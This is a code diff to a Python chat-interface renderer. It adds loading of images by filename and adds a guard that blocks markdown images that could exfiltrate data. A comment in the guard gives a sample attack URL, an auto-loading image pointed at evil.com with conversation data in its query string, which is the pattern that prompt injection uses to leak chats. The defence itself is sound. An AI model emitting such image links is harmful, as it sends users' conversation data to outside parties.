@@ -8,7 +8,6 @@ from __future__ import annotations
 
 import html as _html
 import logging
-import os
 import re
 from datetime import datetime
 
@@ -40,15 +39,26 @@ def _img_ext(b64: str) -> str:
     return "jpg"
 
 
-def render_image_with_save(b64: str, extra_style: str = "") -> None:
+def render_image_with_save(b64_or_fname: str, extra_style: str = "", thread_id: str | None = None) -> None:
     """Render an image thumbnail with a small save-to-disk button.
 
-    The image is displayed at a reasonable thumbnail size (w-80) but the
-    download always delivers the **original full-resolution** bytes.
+    Accepts either a base64 string or a media filename (loaded from disk).
+    The download always delivers the **original full-resolution** bytes.
     """
     import base64 as _b64_mod
     from ui.export import _save_export
     from datetime import datetime as _dt
+
+    # Resolve filename → base64 if needed
+    b64 = b64_or_fname
+    if thread_id and not b64_or_fname.startswith(("iVBOR", "UklGR", "R0lGO", "/9j/", "AAAA")):
+        # Looks like a filename, not base64 — load from disk
+        from threads import load_media_file
+        raw = load_media_file(thread_id, b64_or_fname)
+        if raw is None:
+            ui.label("⚠ Image file not found").classes("text-xs text-grey-6")
+            return
+        b64 = _b64_mod.b64encode(raw).decode("ascii")
 
     data_uri = _img_data_uri(b64)
     ext = _img_ext(b64)
@@ -242,10 +252,46 @@ def _split_mermaid(parts: list[tuple[str, str | None]]) -> list[tuple[str, str |
     return out
 
 
+# ── Prompt‑injection defence: markdown image exfiltration guard ──────────
+# Matches ![alt](url) where the URL query/fragment is suspiciously long,
+# which could be an attempt to exfiltrate conversation data via an
+# auto-loading <img src="https://evil.com/log?data=..."> tag.
+_EXFIL_IMG_RE = re.compile(
+    r"!\[([^\]]*)\]"                     # ![alt text]
+    r"\("                                # (
+    r"(https?://[^)\s]+)"               # URL
+    r"\)",                               # )
+)
+_B64_SEGMENT_RE_UI = re.compile(r"[A-Za-z0-9+/=]{100,}")
+
+
+def _sanitize_exfil_images(text: str) -> str:
+    """Replace markdown images whose URLs look like data‑exfiltration attempts.
+
+    Suspicious images are converted to plain-text links so the content is
+    still accessible but the browser won't auto-fire a request with
+    embedded data in the query string.
+    """
+    def _check(m: re.Match) -> str:
+        url = m.group(2)
+        qmark = url.find("?")
+        # Check query string length
+        if qmark != -1 and len(url) - qmark > 200:
+            alt = m.group(1) or "image"
+            return f"⚠ *Blocked suspicious image link* — [{alt}]({url})"
+        # Check for base64 segments in URL
+        if _B64_SEGMENT_RE_UI.search(url):
+            alt = m.group(1) or "image"
+            return f"⚠ *Blocked suspicious image link* — [{alt}]({url})"
+        return m.group(0)  # pass through unchanged
+    return _EXFIL_IMG_RE.sub(_check, text)
+
+
 def render_text_with_embeds(text: str) -> None:
     """Render markdown text with inline YouTube video embeds and mermaid diagrams."""
     if not text:
         return
+    text = _sanitize_exfil_images(text)
     text = _auto_fence_mermaid(text)
     seen_yt: set[str] = set()
     last_end = 0
@@ -293,7 +339,7 @@ def render_text_with_embeds(text: str) -> None:
             )
 
 
-def render_message_content(msg: dict) -> None:
+def render_message_content(msg: dict, thread_id: str | None = None) -> None:
     """Render a single message's content inside the current parent element."""
     role = msg.get("role", "assistant")
 
@@ -350,8 +396,8 @@ def render_message_content(msg: dict) -> None:
     images = msg.get("images")
     if images:
         caption = "📎 Attached" if role == "user" else "📷 Captured"
-        for b64 in images:
-            render_image_with_save(b64)
+        for img_entry in images:
+            render_image_with_save(img_entry, thread_id=thread_id)
             ui.label(caption).classes("text-xs text-grey-6")
     elif tool_results and any(
         tr.get("name") in ("analyze_image", "👁️ Vision") for tr in tool_results
@@ -402,7 +448,7 @@ def render_message_content(msg: dict) -> None:
         logger.debug("JS runtime unavailable for hljs/mermaid", exc_info=True)
 
 
-def add_chat_message(msg: dict, p: P) -> None:
+def add_chat_message(msg: dict, p: P, thread_id: str | None = None) -> None:
     """Append a rendered chat message to the chat container."""
     if p.chat_container is None:
         return
@@ -423,41 +469,4 @@ def add_chat_message(msg: dict, p: P) -> None:
                     f'</div>',
                     sanitize=False,
                 )
-                render_message_content(msg)
-
-
-def add_terminal_entry(entry: dict, p: P) -> None:
-    """Render a single shell command + output in the terminal panel."""
-    if p.terminal_container is None:
-        return
-    cmd = entry.get("command", "")
-    output = entry.get("output", "")
-    exit_code = entry.get("exit_code", 0)
-    duration = entry.get("duration", 0)
-    cwd = entry.get("cwd", "")
-
-    with p.terminal_container:
-        # Prompt line
-        cwd_short = os.path.basename(cwd) if cwd else "~"
-        color = "#4ec9b0" if exit_code == 0 else "#f44747"
-        ui.html(
-            f'<div style="font-family:monospace; font-size:0.8rem; color:#569cd6;">'
-            f'<span style="color:#888;">{cwd_short}</span> '
-            f'<span style="color:#dcdcaa;">$</span> {cmd}</div>',
-            sanitize=False,
-        )
-        # Output
-        if output:
-            ui.html(
-                f'<pre style="font-family:monospace; font-size:0.75rem; '
-                f'color:#d4d4d4; margin:0; padding:2px 0; white-space:pre-wrap; '
-                f'word-break:break-all; max-height:200px; overflow-y:auto;">'
-                f'{output}</pre>',
-                sanitize=False,
-            )
-        # Exit code badge
-        ui.html(
-            f'<div style="font-size:0.65rem; color:{color}; margin-bottom:4px;">'
-            f'exit {exit_code} · {duration}s</div>',
-            sanitize=False,
-        )
+                render_message_content(msg, thread_id=thread_id)
